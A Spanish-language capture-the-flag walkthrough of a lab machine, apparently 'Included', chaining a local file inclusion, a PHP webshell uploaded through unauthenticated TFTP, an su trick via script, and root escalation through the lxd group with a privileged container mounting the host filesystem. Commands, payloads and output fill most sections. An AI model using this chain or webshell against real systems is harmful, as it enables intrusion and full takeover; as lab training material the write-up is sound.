// 01

Reconocimiento

1
ESCANEO TCP Y UDP
BASH
$ sudo nmap -sT -sV -p22,80 10.129.95.185
$ sudo nmap -sU -p69 10.129.95.185
22/tcp closed ssh
80/tcp open http Apache httpd 2.4.29 (Ubuntu)
69/udp open|filtered tftp

// NOTA

Un TFTP sin autenticación junto a una web con parámetros sospechosos es casi siempre la misma historia: algo se puede escribir por TFTP y algo lo incluye por HTTP.

// 02

LFI y credenciales

2
CONFIRMAR EL LFI
CURL
$ curl -s 'http://10.129.95.185/?file=../../../etc/passwd'
$ curl -s 'http://10.129.95.185/?file=../../../var/www/html/.htpasswd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[…]
mike:Sheffield19

// LOCAL FILE INCLUSION

Dónde: parámetro file de la portada, sin filtrar secuencias ../.
Qué permite: leer cualquier archivo legible por Apache. Lo más valioso no es /etc/passwd sino el propio .htpasswd del sitio, con una credencial en texto plano: mike:Sheffield19.

// 03

Webshell por TFTP

3
SUBIR UN PHP AL DIRECTORIO DE TFTP

TFTP no pide ninguna autenticación. Si su directorio (/var/lib/tftpboot) es alcanzable por el LFI, cualquier archivo que se suba ahí se puede incluir — y si es PHP, Apache lo ejecuta.

TFTP
$ printf '<?php echo shell_exec($_GET["c"]); ?>' > shell_inc.php
$ curl -s -T shell_inc.php 'tftp://10.129.95.185/shell.php'

// OJO

El cliente tftp IP -c "put …" del paquete hpa no acepta esa sintaxis y falla con invalid command. curl -T archivo tftp://IP/nombre funciona a la primera.

4
EJECUTAR EL WEBSHELL VÍA LFI
RCE
$ curl -s -G 'http://10.129.95.185/' \
--data-urlencode 'file=../../../var/lib/tftpboot/shell.php' \
--data-urlencode 'c=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)

// RCE NO INTERACTIVA

No hace falta una reverse shell: el LFI ya ejecuta el PHP subido y devuelve su salida directamente en la respuesta HTTP. Es más rápido para encadenar comandos como éste.

5
PASAR A MIKE Y LEER LA FLAG DE USUARIO
SU
$ curl -s -G 'http://10.129.95.185/' \
--data-urlencode 'file=../../../var/lib/tftpboot/shell.php' \
--data-urlencode 'c=(sleep 1; echo Sheffield19) | script -qec "su mike -c id" /dev/null'
uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)
[flag oculta] # user.txt

// NOTA

su sin un terminal rechaza la contraseña (Authentication failure). El truco es envolverlo en script -qec "..." /dev/null (le da un pseudo-terminal) y meter un sleep 1 antes de la contraseña, para que no se consuma antes de que aparezca el prompt.

// 04

Escalada: grupo lxd

// MIKE PERTENECE AL GRUPO LXD

Pertenecer al grupo lxd equivale a root: ese grupo puede crear contenedores privilegiados y montar el sistema de archivos del host dentro de ellos.

6
CONSTRUIR UNA IMAGEN COMPATIBLE CON LXD 3.0.3

La máquina no tiene salida a Internet real y su LXD es la versión 3.0.3, que espera el formato clásico (metadata.yaml + rootfs). Las imágenes actuales del catálogo vienen en formato Incus y no traen ese fichero, así que hay que fabricar una propia a partir de un rootfs de Alpine.

LXD IMAGE
# metadata.yaml propio (el catálogo actual no lo trae)
sudo tar -C /tmp/lxdmeta -cJf /tmp/metaL.tar.xz metadata.yaml
# /sbin/init que mantiene el contenedor vivo (el rootfs Alpine no arranca solo)
printf '#!/bin/sh\nwhile true; do sleep 60; done\n' | sudo tee /tmp/rootfs_dir/sbin/init
sudo tar -C /tmp/rootfs_dir -cJf /tmp/rootfsM.tar.xz .
7
IMPORTAR, MONTAR EL HOST Y LEER ROOT.TXT
LXC
mike@included:~$ lxc image import /tmp/metaL.tar.xz /tmp/rootfsM.tar.xz --alias alpineimg
mike@included:~$ lxc init alpineimg ignite -c security.privileged=true
mike@included:~$ lxc config device add ignite mydev disk source=/ path=/mnt/root recursive=true
mike@included:~$ lxc start ignite
mike@included:~$ lxc exec ignite -- cat /mnt/root/root/root.txt
[flag oculta]

// FLAGS

user: [flag oculta] · root: [flag oculta]. Ruta completa: LFI → .htpasswd → TFTP + LFI → webshell → su mike → grupo lxd → contenedor privilegiado con / montado. Tiempo total: ~45 minutos (la mayor parte, fabricar la imagen LXD compatible).

// 05

Referencia Comandos

curl -T tftp://
curl -T archivo tftp://IP/nombre
Sube un fichero por TFTP; más fiable que el cliente tftp clásico para un put simple.
curl --data-urlencode
curl -s -G URL --data-urlencode 'file=ruta' --data-urlencode 'c=comando'
Arma una petición GET con varios parámetros codificados correctamente, usada aquí para disparar el LFI y el comando del webshell.
script (pseudo-TTY)
(sleep 1; echo PASS) | script -qec "comando" /dev/null
Da un pseudo-terminal a un comando no interactivo, necesario para que su acepte la contraseña por una tubería.
lxc image import
lxc image import metadata.tar.xz rootfs.tar.xz --alias nombre
Registra una imagen local de contenedor a partir de sus dos partes (metadatos + sistema de archivos).
lxc init / config device add
lxc init imagen nombre -c security.privileged=true
lxc config device add nombre dev disk source=/ path=/mnt/root recursive=true
Crea un contenedor sin aislamiento de usuario (privileged) y le monta el disco raíz del host dentro.

// 06

Glosario

LFI — Local File Inclusion
Vulnerabilidad donde una aplicación incluye y a veces ejecuta un archivo cuyo nombre controla el usuario, sin validar la ruta. Permite leer ficheros del servidor y, si puede apuntar a algo que el usuario subió, ejecutar código.
TFTP
Protocolo de transferencia de ficheros muy simple, sobre UDP y sin autenticación. Si su directorio es accesible desde otro servicio, cualquiera puede escribir ahí.
Grupo lxd
Pertenecer a este grupo en Linux equivale a root: permite crear contenedores privilegiados con el sistema de archivos del host montado dentro, sin necesitar sudo.
Contenedor privilegiado
Contenedor que comparte el espacio de IDs de usuario con el host (security.privileged=true): el root dentro del contenedor es el mismo root del host.
.htpasswd
Fichero de credenciales de Apache para autenticación básica. Si queda dentro del webroot y hay un LFI, se convierte en una filtración directa de usuarios y contraseñas.
metadata.yaml (imagen LXD)
Fichero que describe una imagen de contenedor clásica (arquitectura, fecha, sistema operativo). Versiones antiguas de LXD lo exigen; los formatos de imagen más nuevos (Incus) no lo incluyen.
